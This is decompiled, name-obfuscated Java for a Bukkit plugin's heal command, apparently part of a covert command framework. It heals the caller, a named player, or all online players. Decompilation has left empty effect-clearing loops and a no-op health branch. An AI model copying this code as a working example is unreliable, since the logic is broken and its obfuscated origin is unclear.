/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.potion.PotionEffect
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;

public class HealCommand
extends Command {
    @Override
    public void execute(Core lllIIIIIIl, String lllIIIIIII, String[] llIlllllll, Player llIlllllII) {
        if (llIlllllll.length <= 1) {
            llIlllllII.sendMessage(Settings.PREFIX("You have been healed"));
            if (llIlllllII.getMaxHealth() == 20.0) {
                llIlllllII.setHealth(20.0);
            } else {
                llIlllllII.setMaxHealth(llIlllllII.getMaxHealth());
            }
            for (PotionEffect llIllllIlI : llIlllllII.getActivePotionEffects()) {
            }
        } else if (llIlllllll[1].equals("*")) {
            for (Player lllIIIIlII : Bukkit.getOnlinePlayers()) {
                lllIIIIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been healed by ").append(Settings.RED).append(llIlllllII.getName()))));
                if (lllIIIIlII.getMaxHealth() == 20.0) {
                    lllIIIIlII.setHealth(20.0);
                } else {
                    lllIIIIlII.setHealth(lllIIIIlII.getMaxHealth());
                }
                for (PotionEffect llIllllIII : lllIIIIlII.getActivePotionEffects()) {
                }
            }
            llIlllllII.sendMessage(Settings.PREFIX("Everyone was healed!"));
        } else {
            Player lllIIIIIll = Bukkit.getServer().getPlayer(llIlllllll[1]);
            if (lllIIIIIll == null) {
                llIlllllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llIlllllll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                lllIIIIIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been healed by ").append(Settings.RED).append(llIlllllII.getName()))));
                if (lllIIIIIll.getMaxHealth() == 20.0) {
                    lllIIIIIll.setHealth(20.0);
                } else {
                    lllIIIIIll.setHealth(lllIIIIIll.getMaxHealth());
                }
                for (PotionEffect llIllllIIl : lllIIIIIll.getActivePotionEffects()) {
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public HealCommand() {
        HealCommand lllIIIlIll;
    }
}

